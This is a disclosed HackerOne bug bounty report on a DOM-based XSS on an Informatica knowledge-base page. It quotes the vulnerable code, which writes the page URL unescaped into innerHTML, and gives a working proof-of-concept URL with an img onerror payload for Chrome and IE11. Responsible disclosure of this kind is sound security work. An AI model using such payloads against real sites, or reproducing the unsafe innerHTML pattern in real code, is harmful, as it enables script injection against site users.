# [kb.informatica.com] Dom Based xss

## Report Details
- **Report ID**: 156166
- **URL**: https://hackerone.com/reports/156166
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-08-02T20:04:02.673Z
- **Disclosed**: 2019-08-17T09:48:13.150Z

## Reporter
- **Username**: e3xpl0it
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
Hi! I found Dom based xss on this subdomain https://kb.informatica.com
javaScript security is very important, even more in portals where users store their personal data. 
Attackers can target those portals to find and exploit High-risk JavaScript vulnerabilities like Dom based xss vulnerabilities

POC ,the vulnerable code javascript on this page https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?
view-source: string 1406 /*google chrome

var li = document.createElement("li");
strChild = "<a href="+document.URL+" style='color:#fff !important;font-size:10px'>Search Results</a>";
li.innerHTML = strChild; document.getElementById('DynamicBreadcrumb').appendChild(li);
} 

attack scenario the latest versions of browsers
google chrome https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?#"><img src=x onerror=alert(document.domain)>&infasearch.aspx=hek
IE 11  https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?#"><img src=x onerror=alert(document.domain)>&infasearch.aspx=hek 


## Attachments
- Chrome-Dom_XSS.jpg
- IE-11_Dom_xss.jpg
